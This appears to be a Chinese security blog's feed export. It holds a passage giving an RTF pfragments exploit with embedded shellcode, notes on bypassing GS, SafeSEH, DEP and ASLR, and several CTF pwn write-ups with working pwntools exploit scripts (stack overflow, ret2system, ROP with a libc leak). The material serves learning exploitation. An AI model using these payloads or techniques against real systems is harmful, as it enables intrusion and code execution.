esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞战争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各类型软件漏洞合集</title>
    <link href="/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
    <url>/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-格式化串漏洞"><a href="#0x01-格式化串漏洞" class="headerlink" title="0x01 格式化串漏洞"></a>0x01 格式化串漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。</p><p>此类漏洞发生条件苛刻，实际案例很少。</p><h2 id="能够引起此漏洞的函数"><a href="#能够引起此漏洞的函数" class="headerlink" title="能够引起此漏洞的函数"></a>能够引起此漏洞的函数</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fwprintf</span><span class="hljs-params">(FILE* stream,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> buffer,<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">swprintf</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> *buffer,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vwprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream,<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vfwprintf</span><span class="hljs-params">(FILE *stream,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *buffer,<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vswprintf</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> *buffer,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format,va_list argptr )</span></span>;<br></code></pre></td></tr></tbody></table></figure><h1 id="0x02-GS安全编译选项保护"><a href="#0x02-GS安全编译选项保护" class="headerlink" title="0x02 GS安全编译选项保护"></a>0x02 GS安全编译选项保护</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。</p><h2 id="以下情况不会应用GS"><a href="#以下情况不会应用GS" class="headerlink" title="以下情况不会应用GS"></a>以下情况不会应用GS</h2><ul><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是8字节类型且大小不大于4个字节。</li></ul><h2 id="典型突破GS的方法"><a href="#典型突破GS的方法" class="headerlink" title="典型突破GS的方法"></a>典型突破GS的方法</h2><h3 id="利用未保护的内存"><a href="#利用未保护的内存" class="headerlink" title="利用未保护的内存"></a>利用未保护的内存</h3><p>为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。</p><blockquote><p>例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。</p></blockquote><pre><code class="mov">    mov esp,ebp    pop ebp    retn```### 覆盖虚函数程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。&gt; 例子：利用C++的虚函数来绕过GS机制。&gt;&gt; 当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。&gt; 虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。### 攻击异常处理GS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS.通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。### 同时替换栈中和.data中的Cookiecookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。&gt; 例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90.&gt; 接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。&gt; 布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址)# 0x03 SafeSEH：对异常处理的保护机制在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。## 校验流程异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下：* 检查异常处理链是否位于当前程序的栈中* 异常处理指针是否指向当前程序栈中* 调用函数RtlIsVaildHandler()对异常处理函数进行校验    * 异常处理函数地址是否在加载模块的内存空间    * 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败）    * 程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续    * 判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败）    * 判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功    * 判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功&gt; RtlIsVaildHandler()允许异常处理函数执行的情况：&gt;&gt; 异常处理函数位于加载模块内存范围之外，DEP关闭&gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）.&gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。## 绕过SafeSEH（不考虑DEP影响）* 攻击返回地址绕过。    * 一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址* 利用虚函数绕过* 从堆中绕过* 利用未启用SafeSEH模块绕过* 利用加载模块之外的地址绕过SafeSEH* # 0x04 DEP## 介绍溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。DEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP.软件DEP即SafeSEH，与CPU硬件无关。硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD）## 攻击DEP方法### 攻击未启用DEP程序### 利用Ret2Libc挑战DEPret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。#### 三种相对有效的绕过DEP的exploit方法* 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行* 通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行* 通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行### 利用可执行内存挑战DEP有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。### 利用.NET挑战DEP.NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。### 利用java applet挑战DEPjava applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。# 0x05 ASLR## 介绍ASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。（支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了）### 映像随机化在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。映像随机化只对加载基址的前2个字节做了随机处理。### 堆栈随机化在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。### PEB和TEB随机化TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。## 攻击方式### 攻击未启用ASLR模块ASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR.如：Adobe Flash Player ActiveX### 利用部分覆盖进行定位内存地址之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。### 利用Heap spray技术定位内存地址Heap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。### 利用Java applet heap spray技术定位内存地址### 为.NET控件禁用ASLR</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 int_overflow</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/</url>
    
    <content type="html"><![CDATA[<h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p><p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p><h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p><p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p><p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p><blockquote><p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p></blockquote><p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p><p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p><p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p><p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p><p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p><p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p><p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p><p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p><p>262-0x14-4-4=234</p><p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p><p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p><p>exp:</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import*<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">39118</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'Your choice:'</span>)<br>flag=<span class="hljs-number">0</span>x0804868B<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'1'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'username:'</span>)<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'z'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'passwd:'</span>)<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x14+<span class="hljs-string">'aaaa'</span>+p32(flag)+<span class="hljs-string">'a'</span>*<span class="hljs-number">234</span><br><span class="hljs-keyword">sh</span>.sendline(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 guess_num</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/</url>
    
    <content type="html"><![CDATA[<p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p><p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" alt="17627983-c6ff7c8db83a9ec7.png"></p><p>进入sub_C3E()函数，确定满足条件即可cat flag。</p><p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" alt="17627983-1e961fbba4dff1bc.png"></p><p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p><blockquote><p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p></blockquote><p>exp:</p><p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" alt="17627983-82da413e439821bd.png"></p><blockquote><p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p></blockquote><p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" alt="17627983-caa9a4e5b8ce9f1a.png"></p><p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p><p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" alt="17627983-93fb0ad7c552854b.png"></p><p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" alt="YnNVrd.png"></p><p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" alt="YnNMPf.png"></p><p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 cgpwn2</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/</url>
    
    <content type="html"><![CDATA[<p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p><p>name是全局变量，在bss区段，适合写入。</p><p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p><p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p><p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p><p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p><p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # p = process(<span class="hljs-string">'./cgpwn2'</span>)<br>p = remote(<span class="hljs-string">"111.198.29.45"</span>,<span class="hljs-number">32966</span>)<br>system_addr = <span class="hljs-number">0x804855A</span><br>bss_addr = <span class="hljs-number">0x804A080</span><br>p.recvuntil(<span class="hljs-string">'name\n'</span>)<br>p.sendline(<span class="hljs-string">"/bin/sh\x00"</span>)<br>p.recvuntil(<span class="hljs-string">'here:\n'</span>)<br>payload = <span class="hljs-number">0x26</span>*<span class="hljs-string">'a'</span> +<span class="hljs-string">'bbbb'</span>+ p32(system_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界pwn-100</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/</url>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳：checksec</p><p><img src="https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png" alt="查壳.PNG"></p><p>64位，无stack,无PIE；</p><p><img src="https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png" alt="1.PNG"></p><p>运行程序，输入字符，无反馈，无限制。</p><p><img src="https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png" alt="漏洞.PNG"></p><p><img src="https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png" alt="漏洞2.PNG"></p><p>ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1.</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。</p><p><img src="https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png" alt="寄存器传参.PNG"></p><p><img src="https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png" alt="IDA查看寄存器.PNG"></p><p>puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即</p><p><code>pop rdi; ret</code><br><code>pop rsi; pop r15; ret</code></p><p><img src="https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png" alt="通过pop控制写入.PNG"></p><blockquote><p>注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数<br>传参顺序默认从后先开始传入。x86 x64一样。</p></blockquote><p>此处需要学习利用寄存器传递参数。</p><blockquote><p>关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。</p></blockquote><p>由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。</p><p>初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：</p><p><img src="https://i.loli.net/2020/05/31/EDtReszWUadf94H.png" alt="初始化.PNG"></p><blockquote><p>程序还需调用一个gadget,后续另起一篇学习</p></blockquote><p><img src="https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png" alt="gadget.PNG"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs #!usr/bin/python"> #coding=utf-8<br>from pwn import *<br> # context.log_level = 'debug'<br>io = remote('124.126.19.106',46612)<br> # io = process("./pwn-100")<br>elf = ELF("./pwn-100")<br>rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15<br>rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)<br>pop_rdi_ret = 0x400763<br> # start_addr = elf.symbols['_start']<br>start_addr = 0x400550<br>puts_plt = elf.plt['puts']<br>read_got = elf.got['read']<br>binsh_addr = 0x601000<br>def leak(addr):<br>  payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)<br>  payload = payload.ljust(200, "a")<br>  io.send(payload)<br>  io.recvuntil("bye~\n")<br>  up = ""<br>  content = ""<br>  count = 0<br>  while True:<br>    c = io.recv(numb=1, timeout=0.5)<br>    count += 1<br>    if up == '\n' and c == "":<br>        content = content[:-1] + '\x00'<br>        break<br>    else:<br>        content += c<br>        up = c<br>  content = content[:4]<br>  log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex')))<br>  return content<br>d = DynELF(leak, elf = elf)<br>sys_addr = d.lookup('system', 'libc')<br>log.info("system_addr =&gt; %#x", sys_addr)<br>payload  = "a" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)<br>payload += p64(rop2)<br>payload += "\x00" * 56  <br>payload += p64(start_addr)<br>payload  = payload.ljust(200, "a")<br>io.send(payload)<br>io.recvuntil("bye~\n")<br> # gdb.attach(io)<br>io.send("/bin/sh\x00")<br>payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)<br>payload = payload.ljust(200, "a")<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WinDbg使用整理</title>
    <link href="/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/"/>
    <url>/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><ul><li>.sympath　　//显示设置的符号表路径</li><li>.reload　　　　//此命令主要用于加载符号表。</li><li>.reload /f　　//重新装载模块</li><li>.reload /i　　//强制加载mismatched symbol</li><li>U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度</li><li>db　　//显示一字节的长度。</li><li>dw　　//显示两字节的长度。</li><li>dd　　//显示四字节的长度。</li><li>dq　　//显示八字节的长度。</li><li>dD　　//显示double实数(8字节的长度)。</li><li>df　　//显示float实数(4字节的长度)。</li><li>da     //显示asscii值</li><li>du     //显示unicode值</li><li>ds     //显示ANI_STRING值</li><li>dS     //显示UNICODE_STRING的值</li><li>eb address value　　//在address 这个地址写入一个字节value</li><li>ew address value　　//在address 这个地址写入两字节value</li><li>ed address value　　//在address 这个地址写入四字节字节value</li><li>eq address value　　//在address 这个地址写入八字节字节value</li></ul><h2 id="0x01-对象相关命令"><a href="#0x01-对象相关命令" class="headerlink" title="0x01 对象相关命令"></a>0x01 对象相关命令</h2><ul><li>dt　　//dt命令主要用于查看结构体。</li><li>lm　　//列出模块。</li><li>lm vm 模块名　　//查看模块详细信息。 </li><li>!process 0 0 　　　　//列出系统进程信息</li><li>!process 0 0 进程名  //列出该进程的信息</li><li>!process 0 1 进程名  